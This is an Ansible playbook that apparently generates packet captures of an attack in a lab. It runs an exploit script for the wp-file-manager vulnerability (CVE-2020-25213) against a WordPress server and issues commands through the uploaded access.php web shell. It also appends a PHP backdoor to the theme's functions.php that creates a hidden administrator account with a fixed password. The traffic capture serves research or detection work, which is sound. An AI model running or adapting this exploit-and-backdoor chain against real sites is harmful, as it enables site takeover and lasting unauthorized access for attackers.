---
- name: "Enable packet capture and simulate attack"
  hosts: all
  become: yes
  vars_files:
    - ../misc/vault.yml

  vars:
    ansible_become_pass: "{{ web_server_pass }}" # Both are the same in this case
    attacker_ip: "{{ attack_server_ip }}"
    target_ip: "{{ web_server_ip }}"
    pcap_dir: "/tmp/pcap_files"
    script_dir: "/tmp/wp-file-manager-CVE-2020-25213/access.php"
    access_url: "http://{{ target_ip }}/wordpress/wp-content/plugins/wp-file-manager/lib/files/access.php"
    capture_duration: 10  # Duration in seconds for packet capture after attack
    attack_script_path: "/tmp/wp-file-manager-CVE-2020-25213/wp-file-manager-exploit.sh"  # Path to attack script

  tasks:
    - name: "Ensure tcpdump is installed on both machines"
      apt:
        name: tcpdump
        state: present
        update_cache: yes

    - name: "Create directory for PCAP files on both machines"
      file:
        path: "{{ pcap_dir }}"
        state: directory
        mode: '0755'

    - name: "Verify attack script exists"
      stat:
        path: "{{ attack_script_path }}"
      register: attack_script_check

    - name: "Start baseline packet capture on target machine"
      ansible.builtin.shell: >
        nohup tcpdump -i any -w {{ pcap_dir }}/baseline_target.pcap port 80 > /tmp/tcpdump_baseline_target.log 2>&1 &
      when: inventory_hostname == "web_server"

    - name: "Pause for baseline capture duration"
      ansible.builtin.pause:
        seconds: "{{ capture_duration }}"
      when: inventory_hostname == "web_server"

    - name: "Stop all tcpdump processes for baseline"
      ansible.builtin.shell: >
        pkill -f "tcpdump -i any"
      failed_when: false
      when: inventory_hostname == "web_server"

    - name: "Retrieve baseline PCAP file from target machine"
      fetch:
        src: "{{ pcap_dir }}/baseline_target.pcap"
        dest: "../misc/baseline_target.pcap"
        flat: yes
      when: inventory_hostname == "web_server"

    - name: "Start packet capture on attacker machine"
      ansible.builtin.shell: >
        nohup tcpdump -i any -w {{ pcap_dir }}/attacker.pcap host {{ target_ip }} > /tmp/tcpdump_attacker.log 2>&1 &
      when: inventory_hostname == "attack_server"

    - name: "Start HTTP packet capture on target machine"
      ansible.builtin.shell: >
        nohup tcpdump -i any -w {{ pcap_dir }}/target.pcap port 80 > /tmp/tcpdump_target.log 2>&1 &
      when: inventory_hostname == "web_server"

    - name: "Upload access script to web server"
      ansible.builtin.shell: >
        bash {{ attack_script_path }} -u {{ target_ip }}/wordpress -f {{ script_dir }} -v || exit 1
      when:
        - inventory_hostname == "attack_server"
        - attack_script_check.stat.exists

    - name: "Verify PHP backdoor is accessible"
      uri:
        url: "{{ access_url }}"
        method: GET
        status_code: 200

    - name: "Send command via URL"
      uri:
        url: "{{ access_url }}?cmd=ls"
        return_content: yes
        method: GET
      register: command_output
      when:
        - inventory_hostname == "attack_server"

    - name: "Inspect response"
      debug:
        var: command_output.content
      when:
        - inventory_hostname == "attack_server"

    - name: "Create backup backdoor via command execution"
      uri:
        url: "http://{{ target_ip }}/wordpress/?cmd={{ inject_backdoor_command | urlencode }}"
        return_content: yes
        method: GET
      register: backdoor_injection
      when: inventory_hostname == "attack_server"
      vars:
        inject_backdoor_command: |
          echo '<?php
          add_action("wp_head", "WordPress_backdoor");
          function WordPress_backdoor() {
              if ($_GET["backdoor"] == "go") {
                  require("wp-includes/registration.php");
                  if (!username_exists("backdooradmin")) {
                      $user_id = wp_create_user("backdooradmin", "Pa55W0rd");
                      $user = new WP_User($user_id);
                      $user->set_role("administrator");
                  }
              }
          }
          ?>' >> /var/www/html/wordpress/wp-content/themes/twentytwentyone/functions.php

    - name: "Verify backdoor installation"
      uri:
        url: "http://{{ target_ip }}/wordpress/?cmd=tail+-n+10+/var/www/html/wordpress/wp-content/themes/twentytwentyone/functions.php"
        return_content: yes
        method: GET
      register: backdoor_verify
      when: inventory_hostname == "attack_server"

    - name: "Wait for packet capture to complete"
      ansible.builtin.pause:
        seconds: "{{ capture_duration }}"

    - name: "Stop all tcpdump processes on both machines"
      ansible.builtin.shell: >
        pkill -f "tcpdump -i any"
      failed_when: false

    - name: "Ensure PCAP files are readable"
      ansible.builtin.shell: >
        chmod 644 {{ pcap_dir }}/*.pcap
      become: yes

    - name: "Ensure local directory for captured data exists and is writable"
      local_action:
        module: file
        path: "./captured_data"
        state: directory
        mode: '0755'
        owner: sadr0144
        group: sadr0144

    - name: "Retrieve PCAP file from attacker machine"
      fetch:
        src: "{{ pcap_dir }}/attacker.pcap"
        dest: "../misc/attacker.pcap"
        flat: yes
      when: inventory_hostname == "attack_server"

    - name: "Retrieve PCAP file from target machine"
      fetch:
        src: "{{ pcap_dir }}/target.pcap"
        dest: "../misc/target.pcap"
        flat: yes
      when: inventory_hostname == "web_server"

    - name: "Clean up PCAP files on both machines"
      file:
        path: "{{ pcap_dir }}"
        state: absent